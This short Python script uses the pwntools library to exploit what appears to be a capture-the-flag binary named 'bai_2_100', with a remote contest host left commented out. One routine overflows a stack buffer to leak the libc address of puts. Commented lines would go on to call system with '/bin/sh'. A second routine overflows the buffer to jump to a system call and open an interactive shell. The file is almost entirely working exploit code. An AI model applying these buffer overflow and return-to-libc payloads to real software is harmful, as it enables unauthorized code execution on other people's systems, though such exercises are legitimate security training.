from pwn import *

puts = 0x8048699
printfgot = 0x0804A014
putsgot = 0x804A01C
check = 0x804857B
goisystem = 0x08048675
#r = remote('banana.nightst0rm.net', 1337)
r=process('./bai_2_100')
def solve1():

    gdb.attach(r, '''
    break *0x0804867F 
    break *0x804853D
    break *0x8048675
    break *0x08048549
    break *0x0804862b
    break *0x804865f
    telescope 30
    c
    ''')

    #libc = ELF('libc.so')
    r.recvline()
    r.send('\x00')
    r.send('a'*0x4c+p32(puts)+p32(putsgot)+'\x00')
    r.recvline()
    txt = r.recvline()
    put = u32(txt[:4])
    log.info(hex(put))
    #base = put - libc.symbols['puts']
    #log.info(hex(base))
    #system = base + libc.symbols['system']
    #sh = base + next(libc.search('/bin/sh\x00'))
    #log.info(hex(system))
    #log.info(hex(sh))
    #r.send('\x00')
    #r.send('a'*0x4c+p32(system)+'aaaa'+p32(sh)+'\x00')
    r.interactive()

def solve2():
    r.recvline()
    r.send('a'*0x2c+p32(goisystem)+p32(0x1337aa))
    r.send('a'*0x4c+p32(goisystem)+'\x00')
    r.interactive()

if __name__ == '__main__':
    solve1()
